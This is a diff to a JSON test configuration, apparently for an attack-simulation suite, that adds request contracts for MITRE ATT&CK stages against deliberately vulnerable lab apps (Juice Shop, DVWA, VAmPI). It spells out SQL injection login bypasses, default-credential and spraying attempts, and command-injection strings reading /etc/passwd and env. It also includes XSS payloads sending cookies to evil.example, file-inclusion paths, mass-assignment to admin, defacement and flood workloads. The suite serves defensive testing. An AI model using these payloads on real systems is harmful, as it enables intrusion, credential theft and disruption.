@@ -8766,7 +8766,273 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "headers-0",
+            "method": "HEAD",
+            "path": "/",
+            "payload_class": "service-header-assessment",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "headers-1",
+            "method": "HEAD",
+            "path": "/health",
+            "payload_class": "service-header-assessment",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "headers-2",
+            "method": "HEAD",
+            "path": "/httpbin/headers",
+            "payload_class": "service-header-assessment",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "nikto",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nikto-service-scan",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": "(?i)nikto"
+            }
+          },
+          {
+            "id": "users",
+            "method": "GET",
+            "path": "/juice-shop/api/Users",
+            "payload_class": "account-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "vampi",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "account-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "proxy",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "network-diagnostics",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-0",
+            "method": "GET",
+            "path": "/admin",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-1",
+            "method": "GET",
+            "path": "/login",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-2",
+            "method": "GET",
+            "path": "/register",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-3",
+            "method": "GET",
+            "path": "/api",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-4",
+            "method": "GET",
+            "path": "/api/v1",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-5",
+            "method": "GET",
+            "path": "/api/v2",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-6",
+            "method": "GET",
+            "path": "/users",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-7",
+            "method": "GET",
+            "path": "/products",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-8",
+            "method": "GET",
+            "path": "/orders",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-9",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-10",
+            "method": "GET",
+            "path": "/status",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-11",
+            "method": "GET",
+            "path": "/metrics",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-12",
+            "method": "GET",
+            "path": "/debug",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-13",
+            "method": "GET",
+            "path": "/console",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-14",
+            "method": "GET",
+            "path": "/config",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-15",
+            "method": "GET",
+            "path": "/.env",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-16",
+            "method": "GET",
+            "path": "/.git/config",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-17",
+            "method": "GET",
+            "path": "/robots.txt",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-18",
+            "method": "GET",
+            "path": "/sitemap.xml",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-19",
+            "method": "GET",
+            "path": "/swagger.json",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-20",
+            "method": "GET",
+            "path": "/openapi.json",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-21",
+            "method": "GET",
+            "path": "/docs",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-22",
+            "method": "GET",
+            "path": "/backup",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-23",
+            "method": "GET",
+            "path": "/index.php.bak",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-24",
+            "method": "GET",
+            "path": "/web.config",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-25",
+            "method": "GET",
+            "path": "/.htaccess",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-26",
+            "method": "GET",
+            "path": "/security.php",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-27",
+            "method": "GET",
+            "path": "/setup.php",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-28",
+            "method": "GET",
+            "path": "/ftp",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "word-29",
+            "method": "GET",
+            "path": "/graphql",
+            "payload_class": "ffuf-wordlist-discovery",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "mitre-attack/02-initial-access",
@@ -8779,7 +9045,126 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "sqli-0",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "sql-login-bypass",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"admin'--\",\"password\":\"x\"}"
+          },
+          {
+            "id": "sqli-1",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "sql-login-bypass",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}"
+          },
+          {
+            "id": "sqli-2",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "sql-login-bypass",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"admin'/*\",\"password\":\"x\"}"
+          },
+          {
+            "id": "sqli-3",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "sql-login-bypass",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"') OR ('1'='1\",\"password\":\"x\"}"
+          },
+          {
+            "id": "juice-credential-0",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "known-account-login",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}"
+          },
+          {
+            "id": "juice-credential-1",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "known-account-login",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}"
+          },
+          {
+            "id": "juice-credential-2",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "known-account-login",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"bender@juice-sh.op\",\"password\":\"OhG0dPlease1nsique\"}"
+          },
+          {
+            "id": "vampi-credential-0",
+            "method": "POST",
+            "path": "/vampi/users/v1/login",
+            "payload_class": "known-account-login",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"username\":\"admin\",\"password\":\"admin\"}"
+          },
+          {
+            "id": "vampi-credential-1",
+            "method": "POST",
+            "path": "/vampi/users/v1/login",
+            "payload_class": "known-account-login",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"username\":\"admin\",\"password\":\"password\"}"
+          },
+          {
+            "id": "vampi-credential-2",
+            "method": "POST",
+            "path": "/vampi/users/v1/login",
+            "payload_class": "known-account-login",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"username\":\"admin\",\"password\":\"123456\"}"
+          },
+          {
+            "id": "vampi-credential-3",
+            "method": "POST",
+            "path": "/vampi/users/v1/login",
+            "payload_class": "known-account-login",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"username\":\"test\",\"password\":\"test\"}"
+          },
+          {
+            "id": "command",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1;whoami",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "dvwa-login",
+            "method": "POST",
+            "path": "/dvwa/login.php",
+            "payload_class": "default-account-login",
+            "minimum_dispatches": 1,
+            "body_regex": "username=admin&password=password&Login=Login&user_token=.+"
+          },
+          {
+            "id": "hydra",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/brute/",
+            "payload_class": "hydra-password-guessing",
+            "minimum_dispatches": 2,
+            "query_regex": "username=admin&password=.+&Login=Login"
+          }
+        ]
+      }
     },
     {
       "id": "mitre-attack/03-execution",
@@ -8792,7 +9177,157 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "command-0",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "unix-command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; id",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "command-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "unix-command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; whoami",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "command-2",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "unix-command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; uname -a",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "command-3",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "unix-command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; cat /etc/passwd",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "command-4",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "unix-command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; env",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "command-5",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "unix-command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; ls -la /",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "command-6",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "unix-command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; hostname",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "command-7",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "unix-command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; ps aux",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "command-8",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "unix-command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1 && netstat -tlnp",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "xss-0",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "javascript-payload-delivery",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<script>document.location=\"http://evil.example/?c=\"+document.cookie</script>"
+            }
+          },
+          {
+            "id": "xss-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "javascript-payload-delivery",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<img src=x onerror=\"fetch(\\\"http://evil.example/\\\"+document.cookie)\">"
+            }
+          },
+          {
+            "id": "xss-2",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "javascript-payload-delivery",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<svg onload=\"new Image().src=\\\"http://evil.example/?d=\\\"+document.domain\">"
+            }
+          },
+          {
+            "id": "xss-3",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "javascript-payload-delivery",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<body onload=\"window.open(\\\"http://evil.example/\\\"+document.cookie)\">"
+            }
+          },
+          {
+            "id": "csd-config",
+            "method": "GET",
+            "path": "/csd-demo/health",
+            "payload_class": "display-simulation-inventory",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "mitre-attack/04-credential-access",
@@ -8805,7 +9340,182 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "hydra",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "hydra-credential-guessing",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "user-agent": "(?i)hydra"
+            }
+          },
+          {
+            "id": "medusa",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "medusa-login-probe",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": "(?i)medusa"
+            }
+          },
+          {
+            "id": "spray-0",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "password-spray",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}"
+          },
+          {
+            "id": "spray-1",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "password-spray",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"jim@juice-sh.op\",\"password\":\"admin123\"}"
+          },
+          {
+            "id": "spray-2",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "password-spray",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"bender@juice-sh.op\",\"password\":\"admin123\"}"
+          },
+          {
+            "id": "spray-3",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "password-spray",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"mc.safesearch@juice-sh.op\",\"password\":\"admin123\"}"
+          },
+          {
+            "id": "spray-4",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "password-spray",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"ciso@juice-sh.op\",\"password\":\"admin123\"}"
+          },
+          {
+            "id": "stuff-0",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "credential-stuffing",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}"
+          },
+          {
+            "id": "stuff-1",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "credential-stuffing",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}"
+          },
+          {
+            "id": "stuff-2",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "credential-stuffing",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"bender@juice-sh.op\",\"password\":\"OhG0dPlease1nsique\"}"
+          },
+          {
+            "id": "stuff-3",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "credential-stuffing",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"mc.safesearch@juice-sh.op\",\"password\":\"Mr. N00dles\"}"
+          },
+          {
+            "id": "stuff-4",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "credential-stuffing",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"admin@juice-sh.op\",\"password\":\"password\"}"
+          },
+          {
+            "id": "credential-file-0",
+            "method": "GET",
+            "path": "/juice-shop/ftp/",
+            "payload_class": "unsecured-credential-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "credential-file-1",
+            "method": "GET",
+            "path": "/juice-shop/encryptionkeys/",
+            "payload_class": "unsecured-credential-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "credential-file-2",
+            "method": "GET",
+            "path": "/juice-shop/robots.txt",
+            "payload_class": "unsecured-credential-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "credential-file-3",
+            "method": "GET",
+            "path": "/juice-shop/.well-known/security.txt",
+            "payload_class": "unsecured-credential-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "credential-file-4",
+            "method": "GET",
+            "path": "/juice-shop/api-docs/",
+            "payload_class": "unsecured-credential-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "credential-file-5",
+            "method": "GET",
+            "path": "/vampi/openapi.json",
+            "payload_class": "unsecured-credential-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "credential-file-6",
+            "method": "GET",
+            "path": "/vampi/console",
+            "payload_class": "unsecured-credential-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "union",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "credential-query",
+            "minimum_dispatches": 1,
+            "query_regex": "q=.+UNION.+FROM\\+Users--"
+          },
+          {
+            "id": "cookie-read",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "session-cookie-observation",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "cookie-head",
+            "method": "HEAD",
+            "path": "/dvwa/login.php",
+            "payload_class": "session-cookie-header-observation",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "mitre-attack/05-discovery",
@@ -8818,7 +9528,172 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "discovery-0",
+            "method": "GET",
+            "path": "/juice-shop/ftp/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-1",
+            "method": "GET",
+            "path": "/juice-shop/encryptionkeys/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-2",
+            "method": "GET",
+            "path": "/juice-shop/robots.txt",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-3",
+            "method": "GET",
+            "path": "/juice-shop/api-docs/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-4",
+            "method": "GET",
+            "path": "/juice-shop/.well-known/security.txt",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-5",
+            "method": "GET",
+            "path": "/vampi/openapi.json",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-6",
+            "method": "GET",
+            "path": "/vampi/console",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-7",
+            "method": "GET",
+            "path": "/dvwa/config/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-8",
+            "method": "GET",
+            "path": "/dvwa/docs/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-9",
+            "method": "GET",
+            "path": "/dvwa/phpinfo.php",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-10",
+            "method": "GET",
+            "path": "/httpbin/spec.json",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-11",
+            "method": "GET",
+            "path": "/juice-shop/api/Users",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-12",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-13",
+            "method": "GET",
+            "path": "/juice-shop/api/Challenges",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-14",
+            "method": "GET",
+            "path": "/juice-shop/metrics",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-15",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-16",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-17",
+            "method": "GET",
+            "path": "/dvwa/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-18",
+            "method": "GET",
+            "path": "/vampi/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-19",
+            "method": "GET",
+            "path": "/httpbin/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-20",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-21",
+            "method": "GET",
+            "path": "/csd-demo/",
+            "payload_class": "application-and-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "headers",
+            "method": "HEAD",
+            "path": "/",
+            "payload_class": "server-header-discovery",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "mitre-attack/06-collection-exfiltration",
@@ -8831,7 +9706,146 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "file-0",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "local-file-inclusion",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "page": "../../../etc/passwd"
+            }
+          },
+          {
+            "id": "file-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "local-file-inclusion",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "page": "../../../etc/hosts"
+            }
+          },
+          {
+            "id": "file-2",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "local-file-inclusion",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "page": "../../../proc/self/environ"
+            }
+          },
+          {
+            "id": "file-3",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "local-file-inclusion",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "page": "php://filter/convert.base64-encode/resource=../../../etc/passwd"
+            }
+          },
+          {
+            "id": "collection-0",
+            "method": "GET",
+            "path": "/juice-shop/api/Products",
+            "payload_class": "bulk-api-collection",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "collection-1",
+            "method": "GET",
+            "path": "/juice-shop/api/Users",
+            "payload_class": "bulk-api-collection",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "collection-2",
+            "method": "GET",
+            "path": "/juice-shop/api/Feedbacks",
+            "payload_class": "bulk-api-collection",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "collection-3",
+            "method": "GET",
+            "path": "/juice-shop/api/Challenges",
+            "payload_class": "bulk-api-collection",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "collection-4",
+            "method": "GET",
+            "path": "/juice-shop/api/SecurityQuestions",
+            "payload_class": "bulk-api-collection",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "collection-5",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "bulk-api-collection",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "collection-6",
+            "method": "GET",
+            "path": "/juice-shop/ftp/",
+            "payload_class": "bulk-api-collection",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "collection-7",
+            "method": "GET",
+            "path": "/juice-shop/ftp/acquisitions.md",
+            "payload_class": "bulk-api-collection",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "collection-8",
+            "method": "GET",
+            "path": "/juice-shop/ftp/coupons_2013.md.bak",
+            "payload_class": "bulk-api-collection",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "collection-9",
+            "method": "GET",
+            "path": "/juice-shop/ftp/package.json.bak",
+            "payload_class": "bulk-api-collection",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "collection-10",
+            "method": "GET",
+            "path": "/juice-shop/ftp/eastere.gg",
+            "payload_class": "bulk-api-collection",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "counter",
+            "method": "POST",
+            "path": "/csd-demo/exfil",
+            "payload_class": "synthetic-counter-post",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "type": "collection"
+            },
+            "body_regex": "\"technique\":\"T1567\".*\"source\":\"mitre-attack-suite\""
+          },
+          {
+            "id": "counter-read",
+            "method": "GET",
+            "path": "/csd-demo/exfil/log",
+            "payload_class": "counter-receipt-read",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "mitre-attack/07-impact",
@@ -8844,7 +9858,52 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "flood",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "service-exhaustion-workload",
+            "minimum_dispatches": 20,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "delay",
+            "method": "GET",
+            "path": "/httpbin/delay/2",
+            "payload_class": "delayed-response-workload",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "feedback",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks",
+            "payload_class": "synthetic-data-manipulation",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"comment\":\"[MITRE T1565] Data manipulation test - injected feedback\",\"rating\":1}"
+          },
+          {
+            "id": "assignment",
+            "method": "POST",
+            "path": "/vampi/users/v1/register",
+            "payload_class": "privilege-mass-assignment",
+            "minimum_dispatches": 1,
+            "body_regex": "\"admin\":true,\"role\":\"admin\""
+          },
+          {
+            "id": "guestbook",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "synthetic-defacement",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=MITRE&mtxMessage=<h1>Defaced by T1491</h1>&btnSign=Sign+Guestbook"
+          }
+        ]
+      }
     },
     {
       "id": "owasp-scanning/01-zap-baseline",
